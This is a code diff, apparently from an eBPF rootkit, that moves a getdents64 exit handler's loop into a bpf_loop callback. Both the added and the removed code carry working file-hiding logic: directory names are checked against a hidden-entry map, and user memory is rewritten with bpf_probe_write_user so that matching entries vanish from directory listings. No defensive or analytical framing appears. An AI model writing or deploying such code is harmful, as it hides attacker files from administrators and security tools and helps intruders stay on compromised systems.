@@ -341,6 +341,63 @@ int gh_getdents_enter(void *ctx)
     return 0;
 }
 
+/* Splice state for one getdents64 result, shared across bpf_loop steps. */
+struct gh_dirent_walk
+{
+    __u64 cur;
+    __u64 end;
+    __u64 prev;
+    __u16 prev_reclen;
+};
+
+/* One record per bpf_loop step: verified once, whatever the compiler emits. 1 stops the walk. */
+static long gh_dirent_step(__u64 index, void *ctx)
+{
+    struct gh_dirent_walk *w = ctx;
+    (void)index;
+
+    /* Bounds check before every read: the loop bound alone does not
+     * prove we stayed inside the caller's buffer. */
+    if (w->cur + sizeof(struct gh_dirent64) > w->end)
+        return 1;
+
+    struct gh_dirent64 rec = {};
+    if (bpf_probe_read_user(&rec, sizeof(rec), (void *)w->cur) != 0)
+        return 1;
+
+    __u16 reclen = rec.d_reclen;
+    /* A record shorter than its own header cannot be valid, and advancing
+     * by it would not terminate. */
+    if (reclen < sizeof(struct gh_dirent64) || w->cur + reclen > w->end)
+        return 1;
+
+    struct gh_dir_key key = {};
+    if (bpf_probe_read_user_str(&key.name, sizeof(key.name),
+                                (void *)(w->cur + __builtin_offsetof(struct gh_dirent64, d_name))) < 0)
+        return 1;
+
+    __u8 *hidden = bpf_map_lookup_elem(&gh_hidden_dirent, &key);
+
+    if (hidden && w->prev)
+    {
+        /* Fold this record into the previous one. The caller walks by
+         * d_reclen, so it never sees this entry. */
+        __u16 merged = w->prev_reclen + reclen;
+        if (bpf_probe_write_user((void *)(w->prev + __builtin_offsetof(struct gh_dirent64, d_reclen)),
+                                 &merged, sizeof(merged)) != 0)
+            return 1;
+        w->prev_reclen = merged;
+    }
+    else
+    {
+        w->prev = w->cur;
+        w->prev_reclen = reclen;
+    }
+
+    w->cur += reclen;
+    return 0;
+}
+
 /* Walk the returned records and splice out the hidden ones. */
 SEC("tracepoint/syscalls/sys_exit_getdents64")
 int gh_getdents_exit(void *ctx)
@@ -364,54 +421,8 @@ int gh_getdents_exit(void *ctx)
     if (ret <= 0 || ret > GH_DIRENT_BUF_MAX)
         return 0;
 
-    __u64 cur = buf;
-    __u64 end = buf + (__u64)ret;
-    __u64 prev = 0;
-    __u16 prev_reclen = 0;
-
-    for (int i = 0; i < GH_DIRENT_MAX; i++)
-    {
-        /* Bounds check before every read: the loop bound alone does not
-         * prove we stayed inside the caller's buffer. */
-        if (cur + sizeof(struct gh_dirent64) > end)
-            break;
-
-        struct gh_dirent64 rec = {};
-        if (bpf_probe_read_user(&rec, sizeof(rec), (void *)cur) != 0)
-            break;
-
-        __u16 reclen = rec.d_reclen;
-        /* A record shorter than its own header cannot be valid, and advancing
-         * by it would not terminate. */
-        if (reclen < sizeof(struct gh_dirent64) || cur + reclen > end)
-            break;
-
-        struct gh_dir_key key = {};
-        if (bpf_probe_read_user_str(&key.name, sizeof(key.name),
-                                    (void *)(cur + __builtin_offsetof(struct gh_dirent64, d_name))) < 0)
-            break;
-
-        __u8 *hidden = bpf_map_lookup_elem(&gh_hidden_dirent, &key);
-
-        if (hidden && prev)
-        {
-            /* Fold this record into the previous one. The caller walks by
-             * d_reclen, so it never sees this entry. */
-            __u16 merged = prev_reclen + reclen;
-            if (bpf_probe_write_user((void *)(prev + __builtin_offsetof(struct gh_dirent64, d_reclen)),
-                                     &merged, sizeof(merged)) != 0)
-                break;
-            prev_reclen = merged;
-        }
-        else
-        {
-            prev = cur;
-            prev_reclen = reclen;
-        }
-
-        cur += reclen;
-    }
-
+    struct gh_dirent_walk w = {.cur = buf, .end = buf + (__u64)ret};
+    bpf_loop(GH_DIRENT_MAX, gh_dirent_step, &w, 0);
     return 0;
 }
 
